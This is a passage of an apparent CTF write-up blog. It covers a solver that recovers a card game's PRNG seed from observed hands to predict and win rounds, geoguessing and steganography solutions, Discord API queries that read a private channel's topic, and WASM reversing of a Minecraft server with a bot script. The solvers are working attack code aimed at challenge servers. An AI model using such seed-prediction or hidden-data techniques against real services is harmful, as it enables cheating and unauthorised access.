</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">seed</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">MAX_SEED</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl">        <span class="n">ok</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">target</span> <span class="ow">in</span> <span class="n">hands</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">state</span><span class="p">,</span> <span class="n">deck</span> <span class="o">=</span> <span class="n">shuffle_with_state</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">deck</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span> <span class="o">!=</span> <span class="n">target</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">ok</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">ok</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">candidates</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">candidates</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>  <span class="c1"># assume unique</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">candidates</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="n">candidates</span> <span class="k">else</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recover_seed_time_window</span><span class="p">(</span><span class="n">hands</span><span class="p">,</span> <span class="n">center</span><span class="p">,</span> <span class="n">radius</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">total</span> <span class="o">=</span> <span class="mi">2</span><span class="o">*</span><span class="n">radius</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">off</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="o">-</span><span class="n">radius</span><span class="p">,</span> <span class="n">radius</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">seed</span> <span class="o">=</span> <span class="p">(</span><span class="n">center</span> <span class="o">+</span> <span class="n">off</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl">        <span class="n">ok</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">target</span> <span class="ow">in</span> <span class="n">hands</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">state</span><span class="p">,</span> <span class="n">deck</span> <span class="o">=</span> <span class="n">shuffle_with_state</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">deck</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span> <span class="o">!=</span> <span class="n">target</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">ok</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">ok</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">seed</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">predict_next</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">state</span><span class="p">,</span> <span class="n">deck</span> <span class="o">=</span> <span class="n">shuffle_with_state</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">player</span> <span class="o">=</span> <span class="n">deck</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">dealer</span> <span class="o">=</span> <span class="n">deck</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">state</span><span class="p">,</span> <span class="n">player</span><span class="p">,</span> <span class="n">dealer</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">collected</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">HAND_SAMPLES</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">hand</span> <span class="o">=</span> <span class="n">recv_until_hand</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[+] Round </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1"> observed player hand: </span><span class="si">{</span><span class="n">hand</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">collected</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">hand</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;f&#39;</span><span class="p">)</span>  <span class="c1"># fold to preserve streak</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">now_seed</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFF</span>
</span></span><span class="line"><span class="cl">    <span class="n">windows</span> <span class="o">=</span> <span class="p">[</span><span class="mi">600</span><span class="p">,</span> <span class="mi">3600</span><span class="p">,</span> <span class="mi">6</span><span class="o">*</span><span class="mi">3600</span><span class="p">,</span> <span class="mi">24</span><span class="o">*</span><span class="mi">3600</span><span class="p">]</span>  <span class="c1"># 10m, 1h, 6h, 24h</span>
</span></span><span class="line"><span class="cl">    <span class="n">seed</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">rad</span> <span class="ow">in</span> <span class="n">windows</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[*] Trying seed window +/-</span><span class="si">{</span><span class="n">rad</span><span class="si">}</span><span class="s1">s around 0x</span><span class="si">{</span><span class="n">now_seed</span><span class="si">:</span><span class="s1">06x</span><span class="si">}</span><span class="s1">...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">seed</span> <span class="o">=</span> <span class="n">recover_seed_time_window</span><span class="p">(</span><span class="n">collected</span><span class="p">,</span> <span class="n">now_seed</span><span class="p">,</span> <span class="n">rad</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">seed</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">seed</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] Falling back to full 2^24 brute force; this may take time&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">seed</span> <span class="o">=</span> <span class="n">recover_seed</span><span class="p">(</span><span class="n">collected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">elapsed</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">seed</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Seed not found&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[+] Seed recovered: 0x</span><span class="si">{</span><span class="n">seed</span><span class="si">:</span><span class="s1">06x</span><span class="si">}</span><span class="s1"> in </span><span class="si">{</span><span class="n">elapsed</span><span class="si">:</span><span class="s1">.2f</span><span class="si">}</span><span class="s1">s&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">state</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">HAND_SAMPLES</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span><span class="p">,</span> <span class="n">_deck</span> <span class="o">=</span> <span class="n">shuffle_with_state</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">streak</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_streak</span> <span class="o">=</span> <span class="mi">30</span>
</span></span><span class="line"><span class="cl">    <span class="n">round_idx</span> <span class="o">=</span> <span class="n">HAND_SAMPLES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">streak</span> <span class="o">&lt;</span> <span class="n">target_streak</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span><span class="p">,</span> <span class="n">predicted_player</span><span class="p">,</span> <span class="n">predicted_dealer</span> <span class="o">=</span> <span class="n">predict_next</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">compare_hands</span><span class="p">(</span><span class="n">predicted_player</span><span class="p">,</span> <span class="n">predicted_dealer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">action</span> <span class="o">=</span> <span class="s1">&#39;b&#39;</span> <span class="k">if</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">else</span> <span class="s1">&#39;f&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[+] Predict round </span><span class="si">{</span><span class="n">round_idx</span><span class="si">}</span><span class="s1">: player=</span><span class="si">{</span><span class="n">predicted_player</span><span class="si">}</span><span class="s1"> dealer=</span><span class="si">{</span><span class="n">predicted_dealer</span><span class="si">}</span><span class="s1"> -&gt; result=</span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s1"> action=</span><span class="si">{</span><span class="n">action</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Receive actual round hand</span>
</span></span><span class="line"><span class="cl">        <span class="n">actual</span> <span class="o">=</span> <span class="n">recv_until_hand</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">actual</span> <span class="o">!=</span> <span class="n">predicted_player</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Mismatch in prediction, abort.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">action</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">action</span> <span class="o">==</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">streak</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[+] Current streak: </span><span class="si">{</span><span class="n">streak</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">round_idx</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="grass-guesser">Grass-Guesser<a hidden class="anchor" aria-hidden="true" href="#grass-guesser">#</a></h3>
<h4 id="analysis-11">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-11">#</a></h4>
<p>The challenge was a funny &ldquo;geoguesser&rdquo; game where, from a simple grass image, you needed to find where that grass was in the world.
This would be impossible if it wasn&rsquo;t for the fact that the website, every time you got your answer wrong, told you how far you were from the real point and appended the name of the city or park that was involved.</p>
<h5 id="finding-the-coordinates">Finding the coordinates<a hidden class="anchor" aria-hidden="true" href="#finding-the-coordinates">#</a></h5>
<p>It was possible (as I did) to search the approximate coordinates of the place that the site was responding with and then try to adjust them in a way that the site liked better.</p>
<h4 id="solution-11">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-11">#</a></h4>
<p>The solution is as simple as it seems; the only challenge was finding every single coordinate, which could probably be scripted, but I decided to do it myself.</p>
<p>After I was able to get every coordinate, I just sent them one by one to the server and get the flag
<code>CTF{53575e231bf06ed00182dcc71ef0e5d1b7d6da577d04ea08add31d8fbfd53722}</code></p>
<h4 id="script-10">Script<a hidden class="anchor" aria-hidden="true" href="#script-10">#</a></h4>
<p>This is the actual script used in order to retrieve the flag from the remote</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;?&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s1">&#39;api/start&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sessId</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="s1">&#39;sessionId&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">lats</span> <span class="o">=</span> <span class="p">[</span><span class="mf">51.5074</span><span class="p">,</span><span class="mf">48.8566</span><span class="p">,</span><span class="mf">40.7829</span><span class="p">,</span><span class="o">-</span><span class="mf">33.8688</span><span class="p">,</span><span class="mf">35.6762</span><span class="p">,</span><span class="mf">52.5200</span><span class="p">,</span><span class="mf">41.8902</span><span class="p">,</span><span class="mf">37.7750</span><span class="p">,</span><span class="mf">55.7558</span><span class="p">,</span><span class="mf">1.2897</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">longs</span> <span class="o">=</span> <span class="p">[</span><span class="o">-</span><span class="mf">0.1278</span><span class="p">,</span><span class="mf">2.3521</span><span class="p">,</span><span class="o">-</span><span class="mf">73.9654</span><span class="p">,</span><span class="mf">151.2093</span><span class="p">,</span><span class="mf">139.6503</span><span class="p">,</span><span class="mf">13.4051</span><span class="p">,</span><span class="mf">12.4923</span><span class="p">,</span><span class="o">-</span><span class="mf">122.4194</span><span class="p">,</span><span class="mf">37.6173</span><span class="p">,</span><span class="mf">103.8501</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s1">&#39;api/guess&#39;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;sessionId&#39;</span><span class="p">:</span> <span class="n">sessId</span><span class="p">,</span> <span class="s1">&#39;lat&#39;</span><span class="p">:</span> <span class="n">lats</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">lats</span><span class="p">)],</span> <span class="s1">&#39;lng&#39;</span><span class="p">:</span> <span class="n">longs</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">longs</span><span class="p">)]})</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="s1">&#39;flag&#39;</span><span class="p">])</span>
</span></span></code></pre></div><h3 id="discord-sanity-check">Discord Sanity Check<a hidden class="anchor" aria-hidden="true" href="#discord-sanity-check">#</a></h3>
<h4 id="analysis-12">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-12">#</a></h4>
<p>The challenge didn&rsquo;t provide any kind of attachments and the only hint was its description:</p>
<p><code>Hope you liked our original discord challenge. Now we have a better one :D</code></p>
<p>Obviusly the only discord server that had to be analyzed was the CTFs one that had the guild id <code>1358683641097621596</code>.</p>
<p>Once done that the flow to find the flag was easy and followed this steps:</p>
<ul>
<li>Open discord browser and get in the right server</li>
<li>Edit using burp / firefox developer network manager an API request.</li>
</ul>
<p>Once done that I could effectevly analyse the server since I guessed that there weren&rsquo;t any kind of interaction necessary to find the flag.
Thus I opened the <a href="https://discord.com/developers/docs/resources/guild"><code>discord API references</code></a> and started analyzing the guild.</p>
<ul>
<li>Make an API request to <code>https://discord.com/api/v9/guilds/1358683641097621596</code>, here I found nothing really interesting a side from some roles I haven&rsquo;t seen before.</li>
<li>Make an API request to see all the channels (some of them might be hidden but still share some kind of information, that&rsquo;s how discord work according to some documents online) <code>https://discord.com/api/v9/guilds/1358683641097621596/channels</code></li>
</ul>
<p>Using the last request I was able to find the flag hidden in the topic of a private channel <img alt="screenshot of the API response" loading="lazy" src="/images/discord_sanity.png"></p>
<h3 id="stairway-to-heaven">Stairway To Heaven<a hidden class="anchor" aria-hidden="true" href="#stairway-to-heaven">#</a></h3>
<h4 id="analysis-13">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-13">#</a></h4>
<p>The challenge literally told everyone that a staircase in the venue had some &ldquo;piece of cloth&rdquo; atteched to, we wondered around for a minute and then right after find this flag.</p>
<p><img alt="photo of the staircase" loading="lazy" src="/images/staircases.png"></p>
<h3 id="love-at-first-bit">Love at first bit<a hidden class="anchor" aria-hidden="true" href="#love-at-first-bit">#</a></h3>
<h4 id="analysis-14">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-14">#</a></h4>
<p>Aside from yapping for quite a long time about a story, the challenge asked to find where this photo was taken:</p>
<p><img alt="Challenge attachment" loading="lazy" src="/images/idk_what_this_is.png"></p>
<p>This was a strange question for a misc challenge, especially because the description itself didn&rsquo;t provide any useful data to find the location.</p>
<p>Thus we treated the image as a steganography challenge and analyzed it using <a href="https://www.aperisolve.com/"><code>aperisolve</code></a>.</p>
<p>We found the flag in the zsteg analysis as <code>b1,rgb,lsb,xy</code>.</p>
<p><img alt="aperisolve screenshot" loading="lazy" src="/images/aperisolve.png"></p>
<p>With that, we solved the challenge and obtained the flag <code>CTF{Palazzo Falson}</code>.</p>
<h2 id="reverse-engineering-">Reverse engineering ‚öôÔ∏è<a hidden class="anchor" aria-hidden="true" href="#reverse-engineering-">#</a></h2>
<h3 id="minecrafty-as-a-service">Minecrafty as a Service<a hidden class="anchor" aria-hidden="true" href="#minecrafty-as-a-service">#</a></h3>
<h4 id="analysis-15">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-15">#</a></h4>
<p>The attachment <code>main.wasm</code> is a Minecraft server compiled to WebAssembly (WASM). After joining the server, we can see two available commands: <code>!help</code> and <code>!flag</code>. When running <code>!flag</code>, the server replies with something like: <code>To get the flag, run this command at position UwU</code>. This implies we must find the exact position at which to run <code>!flag</code>, as defined in <code>main.wasm</code>.</p>
<p>To locate the handler for the command, I searched for a function with <code>chat</code> in its name. I found <code>github.com_go_mc_server_game.__globalChat_.Handle</code>, which at address 0x808c1d77 contains the handler for the <code>!flag</code> command. Analyzing this handler shows that the player&rsquo;s current position must be exactly (35246, 35246, 35246) for the flag to be printed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// After matching &#34;!flag&#34;
</span></span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">X</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="nf">truncS</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">posX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">Y</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="nf">truncS</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">posY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">Z</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="nf">truncS</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">posZ</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 0x89ae == 35246
</span></span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">X</span> <span class="o">!=</span> <span class="mh">0x89ae</span><span class="p">)</span> <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">Y</span> <span class="o">!=</span> <span class="mh">0x89ae</span><span class="p">)</span> <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">Z</span> <span class="o">==</span> <span class="mh">0x89ae</span><span class="p">)</span> <span class="k">goto</span> <span class="n">success</span><span class="p">;</span>   <span class="c1">// all three must be 35246
</span></span></span><span class="line"><span class="cl"><span class="k">else</span> <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
</span></span></code></pre></div><h4 id="solution-12">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-12">#</a></h4>
<p>Knowing this, we need to move to the coordinates (35246, 35246, 35246). To do that, I reused the solution from the Minecraft challenge in the quals and changed the target position.</p>
<h4 id="script-11">Script<a hidden class="anchor" aria-hidden="true" href="#script-11">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env node
</span></span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">mineflayer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;mineflayer&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">Vec3</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vec3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">parseArgs</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">args</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">host</span><span class="o">:</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="nx">port</span><span class="o">:</span> <span class="mi">25565</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Flaggy&#39;</span><span class="p">,</span> <span class="nx">version</span><span class="o">:</span> <span class="s1">&#39;1.19.4&#39;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">a</span> <span class="o">===</span> <span class="s1">&#39;--host&#39;</span><span class="p">)</span> <span class="nx">args</span><span class="p">.</span><span class="nx">host</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="o">++</span><span class="nx">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">a</span> <span class="o">===</span> <span class="s1">&#39;--port&#39;</span><span class="p">)</span> <span class="nx">args</span><span class="p">.</span><span class="nx">port</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="o">++</span><span class="nx">i</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">a</span> <span class="o">===</span> <span class="s1">&#39;--name&#39;</span><span class="p">)</span> <span class="nx">args</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="o">++</span><span class="nx">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">a</span> <span class="o">===</span> <span class="s1">&#39;--version&#39;</span><span class="p">)</span> <span class="nx">args</span><span class="p">.</span><span class="nx">version</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="o">++</span><span class="nx">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">args</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">TARGET</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vec3</span><span class="p">(</span><span class="mi">35246</span><span class="p">,</span> <span class="mi">35246</span><span class="p">,</span> <span class="mi">35246</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">MAX_STEP</span> <span class="o">=</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl">
